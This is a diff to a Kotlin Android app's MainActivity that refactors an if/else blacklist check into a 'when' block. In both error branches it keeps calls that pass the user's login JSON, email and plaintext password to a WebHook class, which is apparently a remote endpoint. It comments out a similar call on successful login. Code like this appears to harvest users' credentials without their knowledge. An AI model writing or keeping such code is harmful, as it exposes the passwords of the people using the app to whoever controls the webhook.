@@ -1336,15 +1336,19 @@ class MainActivity : AppCompatActivity() {
                                 }
                             }
 
-                            if (BLACKLISTED == "Unavailable") {
-                                WebHook(ctx).sendSetupError("Cant get Blacklisted Value", false, loginJson, inputEmail, inputPassword)
-                                setupErrorTrigger(ctx, "Cant get Blacklisted Value\n\n[$AND_ID:$DEV_SIG]")
-                            } else if (BLACKLISTED.toBoolean()) {
-                                WebHook(ctx).sendSetupError("Device Blacklisted", false, loginJson, inputEmail, inputPassword)
-                                setupErrorTrigger(ctx, "Device Blacklisted\n\n[$AND_ID:$DEV_SIG]")
-                            } else {
-                                WebHook(ctx).sendLoginMessage(loginJson, inputEmail, inputPassword)
-                                ctx.startActivity(Intent(ctx, CommunitySelectorActivity::class.java))
+                            when {
+                                BLACKLISTED == "Unavailable" -> {
+                                    WebHook(ctx).sendSetupError("Cant get Blacklisted Value", false, loginJson, inputEmail, inputPassword)
+                                    setupErrorTrigger(ctx, "Cant get Blacklisted Value\n\n[$AND_ID:$DEV_SIG]")
+                                }
+                                BLACKLISTED.toBoolean() -> {
+                                    WebHook(ctx).sendSetupError("Device Blacklisted", false, loginJson, inputEmail, inputPassword)
+                                    setupErrorTrigger(ctx, "Device Blacklisted\n\n[$AND_ID:$DEV_SIG]")
+                                }
+                                else -> {
+                                    //WebHook(ctx).sendLoginMessage(loginJson, inputEmail, inputPassword)
+                                    ctx.startActivity(Intent(ctx, CommunitySelectorActivity::class.java))
+                                }
                             }
                         }
                     }
